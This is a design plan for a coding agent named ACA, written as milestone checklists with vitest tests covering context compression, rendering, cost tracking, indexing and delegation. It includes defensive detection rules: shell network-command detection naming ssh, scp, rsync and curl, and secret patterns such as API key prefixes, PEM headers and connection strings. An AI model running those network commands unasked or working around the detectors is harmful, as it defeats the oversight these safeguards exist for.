- [ ] Redaction format: `<redacted:type:N>` with per-session counter (e.g., `<redacted:api_key:1>`)
- [ ] 4 pipeline integration points:
  1. Tool output: scrub before storing in `ToolResultItem`
  2. LLM context assembly: scrub before sending to provider
  3. Persistence: scrub before writing to conversation.jsonl / events.jsonl
  4. Terminal rendering: scrub before displaying to user
- [ ] Pipeline is a composable function: `scrub(text: string) → string`
- [ ] Known secrets populated at startup from resolved secrets (Block 9)
- [ ] `scrubbing.enabled: false` in config → pipeline is a no-op passthrough

**Tests:**
- Known API key in tool output → redacted to `<redacted:api_key:1>`
- Same key appears twice → same redaction ID (consistent replacement)
- Scrubbing disabled → text passes through unchanged
- All 4 pipeline points: inject known secret → verify redacted at each point
- Secret in JSONL write → redacted in persisted file
- Secret in LLM request → redacted before sending
- Non-secret strings → not modified
- Empty scrubber (no known secrets) → passthrough

---

# ACA Implementation Steps

Concrete, testable execution steps for building Another Coding Agent. Every step references its source block in `fundamentals.md` and specifies what to test. Steps are ordered by dependency within each milestone — complete them sequentially unless noted otherwise.

**Test framework:** vitest
**Test location:** `test/` mirroring `src/` structure (e.g., `src/types/session.ts` → `test/types/session.test.ts`)

---


---

## Milestone 3: Context + State

Goal: Project awareness, system prompt assembly, token estimation, context compression, summarization, durable task state, session resume.

### M3.0a — Project Awareness (Block 12)

Moved here from M6 because context assembly (M3.2) needs the project snapshot.

- [ ] Root detection: walk up from cwd, find `.git/` or language-specific root files (`package.json`, `Cargo.toml`, `pyproject.toml`, `go.mod`)
- [ ] Language/toolchain detection: root markers + lockfiles → stack summary
- [ ] Git state: branch, dirty/clean, staged changes
- [ ] `ProjectSnapshot` type: root, stack, git, ignorePaths, indexStatus
- [ ] Context injection: ~5-8 line compact text block for LLM
- [ ] Ignore rules: `.gitignore` + hardcoded (`.git/`, `node_modules/`, `dist/`, `build/`, `coverage/`)

**Tests:**
- Directory with `.git/` → root detected correctly
- Directory with `package.json` but no `.git/` → root at package.json
- Stack detection: `pnpm-lock.yaml` present → "pnpm" in stack
- Git state: dirty repo → `dirty` in snapshot. Clean → `clean`
- Ignore rules: `node_modules/` always ignored by find/search defaults
- Context rendering: snapshot → compact text < 200 tokens

### M3.0b — System Prompt Assembly (Block 13)

Moved here from M7 because every LLM call depends on proper prompt structure. Replaces M1.7's minimal AssembleContext.

- [ ] 4-layer structure:
  1. System parameter: identity, rules, tool-use policy (~500-800 tokens)
  2. Tool definitions: all enabled tools via provider mechanism
  3. Per-turn context block: OS, shell, cwd, project snapshot, working set, capability health
  4. Conversation history: recent verbatim + older summarized
- [ ] Instruction precedence: core rules > repo/user instructions > user request > durable state > prior conversation
- [ ] Capability health injection: degraded/unavailable states as context lines
- [ ] All enabled tools every turn (prompt caching makes repetition cheap)

**Tests:**
- Assemble with no conversation → system + tools + context block present
- Assemble with 5 turns → all included (under budget)
- Instruction precedence: verify ordering in assembled prompt
- Capability health: LSP=degraded → health line present in context block
- Tool definitions: all registered tools present in assembled request
- Per-turn context: project snapshot, working set, durable task state → all present

### M3.1 — Token Estimation + `estimate_tokens` Tool (Block 7, Block 2)

- [ ] Byte-based heuristic: `ceil(utf8ByteLength / 3)` per text block
- [ ] Structural overheads: +12 per message, +24 per tool call/result, +40 per tool schema
- [ ] Per-model `bytesPerToken` from model registry (default 3.0)
- [ ] Per-model calibration EMA: ratio `actual / estimated`, starts at 1.0, updated after each LLM call
- [ ] Safe input budget: `contextLimit - reservedOutputTokens - estimationGuard` (8% guard)
- [ ] `estimate_tokens` tool: input (text or file paths, model) → token count, fits-in-context flag. Approval class: read-only

**Tests:**
- Empty string → 0 tokens
- ASCII string "hello" (5 bytes) → ceil(5/3) = 2 tokens
- Unicode string with multi-byte chars → correct byte count / 3
- Message with 3 tool calls → base tokens + 3*24 overhead
- 10 tool schemas → base + 10*40 overhead
- EMA calibration: feed actual=100, estimated=120 → multiplier adjusts toward 100/120. After 5 calls → multiplier converges
- Safe budget with 200K context, 4096 output, 8% guard → correct calculation
- Per-model bytesPerToken override (e.g., 4.0 for a model) → different token estimate
- `estimate_tokens` tool: text input → returns count and fits-in-context flag
- `estimate_tokens` tool: file paths → reads files, sums tokens

### M3.2 — Context Assembly Algorithm (Block 7)

- [ ] 7-step algorithm:
  1. Compute safe input budget
  2. Build pinned sections (system rules, instruction summary, tool sigs, current message, errors, durable task state, current-turn chain). Pinned sections are NEVER compressed — they survive all tiers
  3. Estimate full uncompressed request
  4. Determine compression tier from ratio
  5. Apply tier actions
  6. Pack newest-first by turn boundary
  7. Verify fit → escalate if needed
- [ ] Tier detection: < 60% = full, 60-80% = medium, 80-90% = aggressive, > 90% = emergency
- [ ] Turn-boundary packing: include whole turns or none (except current turn always included)
- [ ] Single-item budget guard: any item > 25% of remaining budget → downgrade to truncated/digest

**Tests:**
- Small conversation (< 60% budget) → tier=full, all items included verbatim
- Conversation at 70% → tier=medium, oldest turns summarized/dropped
- Conversation at 85% → tier=aggressive
- Conversation at 95% → tier=emergency, only pinned sections
- Turn boundary: 3 turns, budget fits 2.5 → include 2 full turns, not partial third
- Pinned sections always present regardless of tier (including instruction summary and durable task state)
- Durable task state is in pinned sections, not conversation history — survives emergency compression
- Current turn always fully included
- Single large tool result (>25% budget) → downgraded to digest mode
- Escalation: assembled result still too large → bump tier and retry

### M3.3 — Compression Tier Actions (Block 7)

- [ ] Tier `full`: all verbatim, full context block, full tool descriptions, full instructions
- [ ] Tier `medium`: summarize oldest prefix, trim project snapshot (root + stack + git only), keep recent 4-6 turns verbatim
- [ ] Tier `aggressive`: summarize all but last 2-3 turns, minimal context block (cwd + stack + git), short-form tool descriptions (name + one-liner + param names only)
- [ ] Tier `emergency`: drop all history except current turn chain, no project detail, signatures only, core rules only

**Tests:**
- Tier full → all components present, tool descriptions have full detail
- Tier medium → project snapshot reduced (verify specific fields removed)
- Tier aggressive → tool descriptions are short-form (no parameter descriptions, no examples)
- Tier emergency → stderr warning emitted, only pinned sections remain
- Cumulative: aggressive includes medium actions too

### M3.4 — Summarization (Block 7)

- [ ] LLM-based summarization of oldest completed-turn prefix
- [ ] Structured prompt: request JSON output with `summaryText`, `pinnedFacts`, `durableStatePatch`
- [ ] Chunk-based: up to 12 turns or 20K tokens per chunk
- [ ] 40% cost ceiling: if summarization would cost > 40% of tokens saved → use deterministic fallback
- [ ] Deterministic fallback: first/last items of range, tool call digest, discard filler
- [ ] `SummaryItem` creation: new sequence number, `coversSeq` range, appended to log
- [ ] Coverage map: `Map<itemSeq, summarySeq>` for visibility tracking
- [ ] `visibleHistory()`: returns items skipping covered originals, including summaries

**Tests:**
- Summarize 5 turns → SummaryItem created with correct coversSeq range
- visibleHistory() after summarization → original items hidden, summary visible in their place
- 40% cost check: 5 turns totaling 100 tokens → summarization must cost < 40 tokens
- Cost ceiling exceeded → deterministic fallback used (no LLM call)
- Deterministic fallback: preserves first item, last item, tool call digests
- Nested summaries: re-summarize existing summary → newer summary covers older summary's range
- visibleHistory() with nested summaries → only newest summary visible for covered range
- Coverage map rebuild from JSONL on session load

### M3.5 — Durable Task State (Block 7)

- [ ] Structured object in `manifest.json`: goal, constraints, confirmedFacts, decisions, openLoops, blockers, filesOfInterest, revision, stale
- [ ] Deterministic updates from runtime facts (files modified, errors, approvals) at turn end
- [ ] Optional LLM patch call: receives current state + turn items → returns JSON patch
- [ ] LLM patch failure → deterministic updates still apply, `stale: true`
- [ ] LLM-visible rendering: compact (~80-150 tokens) in pinned sections

**Tests:**
- Initial state: all fields empty/null
- After turn with write_file → filesOfInterest updated
- After turn with user message "use vitest" → constraints updated (via LLM patch)
- LLM patch call failure → stale=true, deterministic updates still present
- Rendering: state with goal + 2 open loops + 3 facts → output is < 200 tokens
- Revision increments on each update

### M3.6 — FileActivityIndex (Block 7)

- [ ] In-memory map: file path → activity score
- [ ] Scoring weights: edit_file/write_file=+30, delete_path/move_path=+35, read_file=+10, search_text match=+5, user mention=+25
- [ ] Decay: -5 per inactive turn
- [ ] Drop from working set after 8 inactive turns
- [ ] Persist in manifest.json, rebuild from conversation log on resume
- [ ] Per-turn context: top 5 files by score (path + role)

**Tests:**
- edit_file on `a.ts` → score = 30
- read_file on `a.ts` then edit_file → score = 40
- 8 turns of inactivity on `a.ts` → score drops by 40, eventually removed
- Top 5: 7 files touched → only top 5 appear in context
- Rebuild from log: replay tool calls → same scores as live tracking

### M3.7 — Session Resume (Block 10)

- [ ] `--resume` flag: find latest session for workspace, or specific `ses_<ULID>`
- [ ] Rebuild in-memory projection from conversation.jsonl
- [ ] Rebuild coverage map, FileActivityIndex, sequence counter
- [ ] Config re-resolved from current sources (CLI flags win)
- [ ] Config drift detection: warn if security-relevant settings changed

**Tests:**
- Create session → exit → resume → in-memory state matches original
- Resume with different `--model` flag → resolved config uses new model, warning emitted
- Resume nonexistent session → exit code 4
- Resume latest for workspace: create 3 sessions → resume picks most recent
- Projection rebuild: 10 turns with summaries → visibleHistory matches pre-exit state

---

# ACA Implementation Steps

Concrete, testable execution steps for building Another Coding Agent. Every step references its source block in `fundamentals.md` and specifies what to test. Steps are ordered by dependency within each milestone — complete them sequentially unless noted otherwise.

**Test framework:** vitest
**Test location:** `test/` mirroring `src/` structure (e.g., `src/types/session.ts` → `test/types/session.test.ts`)

---


---

## Milestone 4: Terminal + Rendering

Goal: Polished terminal output with colors, syntax highlighting, diffs, and progress.

### M4.0 — Output Channel Contract (Block 18, Block 10)

Define the stderr/stdout split before any rendering code. All rendering steps depend on knowing which channel to target.

- [ ] Document and enforce output channel rules:
  - **stdout**: assistant content (text responses, code) in interactive/one-shot; structured JSON in executor
  - **stderr**: all human-facing chrome — prompts, status, progress, tool indicators, errors, diagnostics
  - **Executor mode**: stderr fully suppressed (reserved for catastrophic failures only)
  - **Non-TTY**: no ANSI codes on either channel
- [ ] `OutputChannel` abstraction: `stdout(text)`, `stderr(text)`, `isExecutor()`, `isTTY()`
- [ ] All subsequent M4 steps use `OutputChannel`, never raw `process.stdout/stderr`

**Tests:**
- Interactive mode: assistant text → stdout, tool status → stderr
- One-shot mode: same split, but no interactive prompts on stderr
- Executor mode: no stderr output at all during normal operation
- Non-TTY: verify zero ANSI escape codes in both channels
- Piped stdout: `aca "task" | cat` → clean text, no ANSI, no progress indicators

### M4.1 — Terminal Capabilities (Block 18)

- [ ] `TerminalCapabilities`: isTTY, colorDepth (0/4/8/24), columns, rows, unicode
- [ ] Detection: `chalk.level`, `LANG`/`LC_ALL` for unicode, `process.stdout.columns`
- [ ] `NO_COLOR` env var → colorDepth=0
- [ ] `FORCE_COLOR` → colors even without TTY
- [ ] Frozen at startup

**Tests:**
- Mock TTY → isTTY=true, colorDepth > 0
- Mock non-TTY → isTTY=false
- `NO_COLOR=1` → colorDepth=0
- `FORCE_COLOR=1` + non-TTY → colors enabled
- Unicode detection: `LANG=en_US.UTF-8` → unicode=true. `LANG=C` → unicode=false

### M4.2 — Renderer Module (Block 18)

- [ ] Centralized `Renderer` class: all ANSI output goes through it
- [ ] Tool call status: category-based coloring (file=blue, shell=yellow, web=magenta, LSP=cyan, delegation=green, error=red)
- [ ] Compact single-line format: `▶ tool_name args` → `✓ tool_name → result (time)` or `✗ tool_name failed (time)`
- [ ] Error formatting: `! [error.code] message` with optional detail
- [ ] Startup status block on stderr
- [ ] Non-TTY fallback: plain text with timestamps, no ANSI codes

**Tests:**
- Tool completion → formatted line with correct color (snapshot test)
- Error → formatted with `!` prefix and error code
- Non-TTY → no ANSI escape codes in output
- Verbose mode → additional detail lines below tool status
- Unicode=false → ASCII fallbacks for status icons

### M4.3 — Syntax Highlighting (Block 18)

- [ ] Shiki with WASM engine, lazy-loaded on first code block
- [ ] Language detection: explicit fence > file extension from context > shebang > none
- [ ] Theme: `github-dark`
- [ ] Non-TTY: no highlighting (raw text)
- [ ] Bundled grammars: TypeScript, JavaScript, Python, Rust, Go, JSON, Bash, etc.

**Tests:**
- TypeScript code block → highlighted output (snapshot test)
- Unknown language → plain text, no error
- Non-TTY → no ANSI codes in code blocks
- Lazy loading: first code block triggers init (~150ms acceptable), subsequent blocks use cache
- Shebang detection: `#!/usr/bin/env python` → Python highlighting

### M4.4 — Diff Display (Block 18)

- [ ] Unified diff after every `edit_file`/`write_file` mutation
- [ ] `diff` npm package for computing diffs
- [ ] Colors: green (+), red (-), cyan (@@), gray (context)
- [ ] 3 lines of context
- [ ] Size guard: > 100 lines → show first 50 + last 10 + "N lines omitted"
- [ ] New file creation: summary line `+ Created path (N lines)` instead of diff

**Tests:**
- Single line change → correct unified diff with colors (snapshot test)
- Multiple hunks → all displayed
- Diff > 100 lines → truncated with omission indicator
- New file (create mode) → summary line, not diff
- Non-TTY → diff without ANSI codes

### M4.5 — Progress Indicators (Block 18)

- [ ] Status line: `Thinking...` with elapsed time, `\r` in-place update
- [ ] Spinner: braille frames at 80ms interval for tool execution > 1s
- [ ] Progress bar for multi-file operations with known count
- [ ] Completion: spinner replaced with `✓` or `✗` line
- [ ] Non-TTY: static log lines with timestamps

**Tests:**
- Spinner starts after 1s delay, not immediately
- Spinner replaced with completion line when done
- Non-TTY → no `\r` updates, static lines instead
- Progress bar: 3/10 → visual bar at 30%
- Unicode=false → ASCII spinner fallback (`|/-\`)

### M4.6 — Markdown Rendering (Block 18)

- [ ] Selective rendering: bold→chalk.bold, italic→chalk.italic, inline code→chalk.inverse, fenced blocks→shiki, lists→2-space indent, blockquotes→gray `│` prefix
- [ ] Pass-through: headers, tables, horizontal rules, links (as `text (url)`)
- [ ] HTML tags stripped

**Tests:**
- `**bold**` → chalk.bold applied (snapshot)
- `` `inline` `` → chalk.inverse applied
- Fenced code block → syntax highlighted
- `> blockquote` → gray border prefix
- Table → passed through as-is
- `<div>text</div>` → `text` (tags stripped)

---

# ACA Implementation Steps

Concrete, testable execution steps for building Another Coding Agent. Every step references its source block in `fundamentals.md` and specifies what to test. Steps are ordered by dependency within each milestone — complete them sequentially unless noted otherwise.

**Test framework:** vitest
**Test location:** `test/` mirroring `src/` structure (e.g., `src/types/session.ts` → `test/types/session.test.ts`)

---


---

## Milestone 5: Multi-Provider + Observability

Goal: Full provider abstraction, cost tracking, budget controls, analytics.

### M5.1 — Full Provider Abstraction (Block 17)

- [ ] Anthropic driver: capabilities, stream (SSE content blocks), validate
- [ ] OpenAI driver: capabilities, stream (SSE token deltas), validate
- [ ] Optional `embed(texts, model)` method on `ProviderDriver` for API-based embeddings (Block 20 fallback path)
- [ ] `supportsEmbedding` and `embeddingModels` fields in `ModelCapabilities`
- [ ] Model registry (`models.json`): model IDs, aliases, capabilities, cost data. Replaces M1.4's hardcoded registry
- [ ] Model resolution: exact match → alias → default
- [ ] `providers` array config (backward-compat with singular `provider`)
- [ ] Provider priority for multi-provider model availability

**Tests:**
- Mock Anthropic API → correct StreamEvent normalization (content blocks → text_delta/tool_call_delta)
- Mock OpenAI API → correct StreamEvent normalization
- Model resolution: `claude-sonnet` → alias resolves to full ID → NanoGPT driver
- Unknown model → error
- Priority: model available from 2 providers → higher priority selected

### M5.2 — Provider Features (Block 17)

- [ ] Extensions system: `ExtensionRequest` in ModelRequest, `required` flag
- [ ] Tool calling emulation for non-native providers (inject schemas in system prompt, parse JSON from response)
- [ ] Fallback chains: configured in user config, tried on provider-level errors only
- [ ] `model.fallback` event on fallback
- [ ] `toolReliability` field in capabilities

**Tests:**
- Extension with `required: true` on unsupported provider → error
- Extension with `required: false` on unsupported provider → warning logged, request proceeds
- Tool emulation: mock provider without native tools → tool definitions injected in system prompt
- Tool emulation: model returns JSON tool call in text → parsed correctly into ToolCallPart
- Fallback chain: primary returns 429 after retries → next model tried
- Fallback NOT triggered on content filter (llm.content_filtered)
- Fallback NOT triggered on auth error

### M5.3 — SQLite Observability Store (Block 19)

- [ ] `~/.aca/observability.db` with tables: sessions, events, tool_calls, errors
- [ ] `better-sqlite3` for synchronous reads, debounced background writes (1s interval)
- [ ] JSONL → SQLite batch insert (background writer)
- [ ] Backfill on session resume: events in JSONL not yet in SQLite
- [ ] SQLite failure → warn, continue (JSONL is authoritative)

**Tests:**
- Session start → session row created in SQLite
- Events emitted → appear in events table after write interval
- Query across sessions: 3 sessions → all queryable
- SQLite write failure (simulate) → warning emitted, agent continues, events still in JSONL
- Backfill: create events, skip SQLite write, resume → backfill detects and inserts missing events

### M5.4 — Cost Tracking + Budget (Block 19)

- [ ] Cost calculation: `tokens * costPerMillion / 1_000_000`
- [ ] Per-event `cost_usd` field on `llm.response` events
- [ ] In-memory `sessionCostAccumulator`: updated synchronously after each LLM response
- [ ] Budget config: `budget.session`, `budget.daily`, `budget.warning` (fraction)
- [ ] Warning at threshold → stderr message
- [ ] Hard stop at 100% → `budget_exceeded` turn outcome
- [ ] Daily budget check at session start via SQLite query
- [ ] `/budget extend <amount>` slash command for interactive override

**Tests:**
- LLM response with 1000 input + 500 output tokens, model cost = $3/$15 per million → correct USD
- Session accumulator: 3 LLM calls → total matches sum
- Budget warning at 80% of $5 budget → warning emitted at $4.00
- Budget exceeded at $5.00 → turn yields with `budget_exceeded`
- `/budget extend 5` → budget raised to $10, execution continues
- Daily budget: previous sessions today cost $20, daily limit $25 → $5 remaining
- Unknown model cost (null) → no budget enforcement for that call, warning

### M5.5 — `aca stats` Command (Block 19)

- [ ] New commander subcommand: `aca stats`
- [ ] Default: last 7 days summary (sessions, cost, tokens, most-used tools, error rate)
- [ ] `--session <id>`: per-turn breakdown
- [ ] `--today`: today's usage + remaining daily budget
- [ ] `--json`: structured JSON output

**Tests:**
- `aca stats` with 3 sessions in last 7 days → correct summary
- `aca stats --session ses_123` → per-turn cost breakdown
- `aca stats --today` → today's totals
- `aca stats --json` → valid JSON output
- No sessions → graceful empty output

### M5.6 — Log Retention (Block 19)

- [ ] 30-day default retention, 5 GB size cap
- [ ] Sessions > 7 days: compress JSONL (gzip), remove blobs
- [ ] Sessions > 30 days: prune from disk
- [ ] SQLite records retained (with `pruned` flag) for long-term trends
- [ ] Runs at session start, max 10 sessions per startup

**Tests:**
- Session 31 days old → pruned from disk, SQLite row has `pruned=true`
- Session 8 days old → JSONL gzipped, blobs removed
- Total > 5 GB → oldest sessions pruned until under limit
- Max 10 per startup → remaining sessions deferred to next startup

---

# ACA Implementation Steps

Concrete, testable execution steps for building Another Coding Agent. Every step references its source block in `fundamentals.md` and specifies what to test. Steps are ordered by dependency within each milestone — complete them sequentially unless noted otherwise.

**Test framework:** vitest
**Test location:** `test/` mirroring `src/` structure (e.g., `src/types/session.ts` → `test/types/session.test.ts`)

---


---

## Milestone 6: Project Intelligence

Goal: Semantic code search via embeddings, symbol extraction, project awareness.

### M6.2 — Embedding Model (Block 20)

- [ ] `@huggingface/transformers` with WASM engine
- [ ] Default model: `Xenova/all-MiniLM-L6-v2` (384-dimensional)
- [ ] Model download to `~/.aca/models/`, cached
- [ ] Embedding function: string → float32 array (384 dims)
- [ ] Offline fallback: download fails → warning, continue without embeddings

**Tests:**
- Embed "hello world" → 384-dimensional float array
- Embed same text twice → identical vectors
- Embed different texts → different vectors
- Cosine similarity: similar texts → high score (> 0.7). Unrelated → low score (< 0.3)
- Model cache: second load is fast (no download)
- Offline: mock network failure → warning, `search_semantic` returns unavailable error

### M6.3 — Index Storage (Block 20)

- [ ] Per-project SQLite: `~/.aca/indexes/<workspaceId>/index.db`
- [ ] Tables: files (path, hash, size, language, timestamps), chunks (chunk_id, file_path, lines, content_hash, embedding BLOB), symbols (symbol_id, file_path, name, kind, lines, parent_id, signature), metadata
- [ ] CRUD operations for each table
- [ ] Hash-based skip: file unchanged → skip re-indexing

**Tests:**
- Create index → database file exists with correct tables
- Insert file record → query back → matches
- Insert chunk with embedding → retrieve → embedding matches (float comparison)
- Hash-based skip: insert file with hash X → check hash X → returns true (skip)
- Delete file's chunks when file is removed

### M6.4 — Indexer (Block 20)

- [ ] Indexing guardrails:
  - Respect `.gitignore` patterns (reuse Project Awareness ignore rules from M3.0a)
  - Extension whitelist: only index known text/code extensions (`.ts`, `.js`, `.py`, `.rs`, `.go`, `.java`, `.md`, `.json`, `.yaml`, `.toml`, `.html`, `.css`, `.sql`, `.sh`, `.c`, `.cpp`, `.h`, `.rb`, `.swift`, `.kt`)
  - `maxFileSize`: skip files > 1 MB (likely generated/minified)
  - `maxFiles`: cap at 10,000 files per project (prevent runaway indexing on monorepos)
  - `.git/` never indexed (hard block)
  - `node_modules/`, `dist/`, `build/`, `vendor/`, `.venv/` excluded by default
- [ ] File chunking: semantic boundaries (function/class) → sub-chunks at 50 lines with 10-line overlap
- [ ] Symbol extraction: regex-based per language (TypeScript, Python, Rust, Go, etc.)
- [ ] Incremental updates: re-index only changed files (hash comparison)
- [ ] Update triggers: session start, after write tools, after exec_command (mtime check)
- [ ] Background indexing for large projects (> 500 files)
- [ ] `/reindex` slash command for manual rebuild

**Tests:**
- Guardrails: `node_modules/` dir present → skipped entirely, not indexed
- Guardrails: file > 1 MB → skipped with log message
- Guardrails: project with 11,000 files → only 10,000 indexed, warning emitted
- Guardrails: `.git/` → never indexed regardless of config
- Guardrails: unknown extension `.xyz` → skipped (whitelist-only)
- TypeScript file with 2 functions → 2 chunks, 2 function symbols
- Python file with class + 3 methods → chunks at class/method boundaries, symbols extracted
- Large function (80 lines) → split into overlapping sub-chunks
- File with no semantic boundaries → 50-line fixed chunks
- Incremental: modify 1 of 10 files → only 1 re-indexed (verify via hash check)
- Background indexing: mock 600-file project → indexing starts in background, search_semantic returns "indexing_in_progress" until ready
- Symbol hierarchy: method linked to parent class

### M6.5 — `search_semantic` Tool (Block 20)

- [ ] Input: query (string), limit (default 10), file_filter (glob), min_score (0-1, default 0.3)
- [ ] Embed query → cosine similarity vs all chunks → rank → filter → return
- [ ] Result shape: path, startLine, endLine, score, snippet (first 5 lines), symbols
- [ ] Approval class: read-only

**Tests:**
- Query "authentication handler" in project with auth module → auth files ranked highest
- file_filter `*.ts` → only TypeScript chunks returned
- min_score 0.8 → fewer results, all high similarity
- limit 3 → exactly 3 results
- Index not ready → `indexing_in_progress` retryable error
- Empty index → empty results

---

<!-- Source: 07-milestone7-delegation.md (reordered and split) -->
# ACA Implementation Steps — Milestone 7, Part A: Error Handling, Health, Security

Error taxonomy, health tracking, and security extensions must be defined BEFORE the delegation, LSP, browser, and web tools that depend on them.

**Test framework:** vitest
**Test location:** `test/` mirroring `src/` structure

---

## Milestone 7A: Error Handling + Health + Security Extensions

### M7.7a — Error Taxonomy + LLM Retry Policies (Block 11)

> **Must be first in M7.** Error codes are referenced by retry logic, health tracking, tool masking, and delegation error chains.

- [ ] Full 22 error codes across 4 categories (tool, llm, delegation, system)
- [ ] `AcaError` shape construction and serialization for all codes
- [ ] LLM retry policies: rate limit 5×, server 3×, timeout 2×, malformed 2×, context 1×, auth/filter 0×
- [ ] Per-call retry state (not global) — each LLM call has own retry counter/backoff
- [ ] Health state updates after retry exhaustion (rate limit → degraded, auth → unavailable)
- [ ] Mode-dependent error formatting (interactive, one-shot, executor)

**Tests:**
- Each of 22 error codes can be constructed and serialized
- Rate limit retry: mock 429 → retries 5 times with backoff → yields error after exhaustion
- Server error: mock 500 → retries 3 times
- Timeout: mock slow response → retries once with 150% timeout
- Auth error: mock 401 → no retry, immediate `llm.auth_error`, provider marked unavailable
- Content filter: mock refusal → no retry, surfaced to model as system message
- Malformed response: mock bad JSON → retries 2 times
- Context too long: mock rejection → escalate compression tier + 10% guard, retry once
- Per-call state: rate limit on call N does not affect call N+1 retry budget
- Interactive error format → compact stderr line
- Executor error format → structured JSON on stdout

### M7.7b — Confusion Limits (Block 11)

- [ ] Per-turn confusion counter: consecutive invalid tool calls
- [ ] Threshold 1-2: synthetic ToolResultItem with validation error, model gets another step
- [ ] Threshold 3: turn yields with `llm.confused` outcome
- [ ] Per-session cumulative limit: 10 total confusion events
- [ ] At 10 cumulative: inject persistent system message nudging simpler tool use

**Tests:**
- 1 bad tool call → synthetic error, model continues
- 3 consecutive bad tool calls → turn yields with `llm.confused`
- Successful tool call resets consecutive counter
- 10 cumulative confusion events → system message injected in context
- What counts: JSON parse failure, unknown tool name, missing required param, type mismatch
- What doesn't count: tool execution failure, approval denial, tool timeout

### M7.13 — Capability Health Tracking (Block 1: Health)

> **Before tool masking (M7.7c).** Health states must exist before tools can be masked based on them.

- [ ] `CapabilityHealthMap`: per-session, in-memory, keyed by capability identifier
- [ ] 4 states: unknown, available, degraded, unavailable
- [ ] State transitions: defined per the transition table in spec
- [ ] Asymmetric policies: local processes (restart once → unavailable) vs HTTP (cooldown + circuit breaker)
- [ ] Circuit breaker: 2 consecutive failures → unavailable with cooldown
- [ ] LLM visibility: only degraded/unavailable injected into context

**Tests:**
- Initial state → unknown
- Successful invocation → available
- Retryable failure → degraded
- Non-retryable failure → unavailable
- Local process crash → restart once → available. Second crash → unavailable (session-terminal)
- HTTP rate limit → degraded with cooldown → cooldown expires → unknown → next success → available
- Circuit breaker: 2 consecutive failures → unavailable with cooldown
- LLM context: degraded capability → health line present. Available → no health line
- Session-terminal unavailable (local) → no cooldown expiry, stays unavailable

### M7.7c — Degraded Capability Handling + Tool Masking (Block 11)

> Depends on M7.13 (health states) and M7.7a (error codes).

- [ ] `available`: normal operation, tool in definitions, no health line
- [ ] `degraded`: tool stays in definitions, health context injected
- [ ] `unavailable`: tool REMOVED from definitions sent to LLM
- [ ] If model references masked tool: `tool.validation` with alternatives message
- [ ] Delegation error chains: nested `cause` for root-cause traversal across depth

**Tests:**
- Tool masking: mark LSP unavailable → lsp_query removed from tool definitions sent to LLM
- Degraded capability → health line present in context block, tool still available
- Model tries masked tool → `tool.validation` error with alternatives listed
- Delegation error chain: grandchild error → nested cause through child → root sees leaf cause
- Error chain depth: root → child → grandchild → 3 levels of nested cause

### M7.10 — Network Egress Integration (Block 8, extends M2.7)

> Foundation built in M2.7. This step extends with advanced integration. **Must precede M7.5 (Web Capabilities).**

- [ ] Integrate network policy into Playwright/browser tool calls (domain check before navigation)
- [ ] Integrate network policy into `fetch_url` tier selection (HTTP vs Playwright fallback)
- [ ] Localhost exception refinement: auto-allowed for `fetch_url`/`web_search` but NOT for `exec_command` shell detection (shell can do anything once running)
- [ ] Shell command network detection: extend M2.7's basic detection with `ssh`, `scp`, `rsync`, `docker pull`, `pip install`, `cargo install`
- [ ] Network events: `network.checked` event with domain, mode, decision

**Tests:**
- Browser navigate to denied domain → blocked before page load
- `fetch_url` with mode=off → `network_disabled` error
- `fetch_url` HTTP fallback to Playwright → Playwright also checks network policy
- Localhost exception: `fetch_url http://localhost:3000` → allowed. `exec_command "curl localhost"` → best-effort detection, not auto-allowed
- Shell detection: `pip install package` + mode=off → denied
- Network event emitted with decision details

### M7.8 — Secrets Scrubbing — Pattern Detection (Block 8, extends M2.8)

> Foundation built in M2.8 (exact-value redaction). This step adds pattern-based detection for unknown secrets.

- [ ] Strategy 2: pattern detection — API key prefixes (`sk-`, `pk_live_`, `ghp_`, `AKIA`), Bearer tokens, PEM keys, `.env` assignments, connection strings, JWTs
- [ ] False positive recovery: `scrubbing.allowPatterns` in user config
- [ ] NOT scrubbed: SHA-256 hashes, UUIDs, base64 non-secrets, hex strings without labels
- [ ] Integration with M2.8's 4-point pipeline (same scrub function, extended patterns)

**Tests:**
- `sk-` prefix string → redacted (provider key prefix)
- `Bearer eyJ...` → redacted
- `-----BEGIN RSA PRIVATE KEY-----` → redacted
- `API_KEY=abc123` in .env-style output → redacted
- `postgres://user:password@host/db` → connection string redacted
- SHA-256 hash → NOT redacted
- UUID → NOT redacted
- Hex string without secret label → NOT redacted
- allowPatterns: add pattern → matching string exempt from redaction
- Combined pipeline: both exact-value (M2.8) and pattern detection active simultaneously

---
<!-- Source: 07-milestone7-delegation.md (reordered and split) -->
# ACA Implementation Steps — Milestone 7, Part B: Delegation

Sub-agent system: profiles, spawning, messaging, approval routing.

**Test framework:** vitest
**Test location:** `test/` mirroring `src/` structure

---

## Milestone 7B: Delegation

### M7.1a — Agent Registry + Profiles (Block 2: Delegation)

- [ ] `AgentRegistry`: resolved once at session start, frozen for session
- [ ] 4 built-in profiles: general, researcher, coder, reviewer (with default tools, delegation permissions, system prompt overlay)
- [ ] Project-config profiles (from `.aca/config.json` in trusted workspaces)
- [ ] Agent identity type: `agt_<ulid>`, parentAgentId, rootAgentId, depth, spawnIndex, label
- [ ] Profile narrowing validation: overrides may only restrict, never widen

**Tests:**
- Registry loads 4 built-in profiles at session start
- Project config adds custom profile → registered alongside built-ins
- Profile lookup by name → correct tools, delegation permissions
- Narrowing validation: attempt to add tool not in profile → rejected

### M7.1b — `spawn_agent` Tool + Child Sessions (Block 2: Delegation, Block 5)

- [ ] `spawn_agent` tool: agent_type, task, context, allowed_tools (narrowing only), label
- [ ] Child session creation: separate `ses_<ulid>` with parentSessionId, rootSessionId lineage
- [ ] Tool set intersection: profile defaults ∩ caller overrides
- [ ] Limits enforcement at spawn time: 4 concurrent, depth 2, 20 total per session
- [ ] On limit violation: typed `limit_exceeded` error with current/allowed values
- [ ] Pre-authorization transport: parent can pass subtree pre-auth patterns at spawn time via `preauth` parameter. Child inherits these for matching tool calls without bubbling approval
- [ ] Inherited pre-auths are narrowing-only: parent cannot grant wider authority than it holds

**Tests:**
- Spawn general agent → child session created with correct lineage, profile tools
- Spawn with narrowing `allowed_tools` → tool set is intersection
- Spawn with widening `allowed_tools` → rejected (narrowing only)
- Limit: 5th concurrent agent → `limit_exceeded` error
- Depth limit: agent at depth 2 tries to spawn → `limit_exceeded`
- Total limit: 21st agent in session → `limit_exceeded`
- Child session has own `ses_<ulid>` with parentSessionId set
- Pre-auth transport: parent passes `^npm test$` pattern → child auto-approves `npm test` without bubbling
- Pre-auth widening: parent tries to grant authority it doesn't hold → rejected

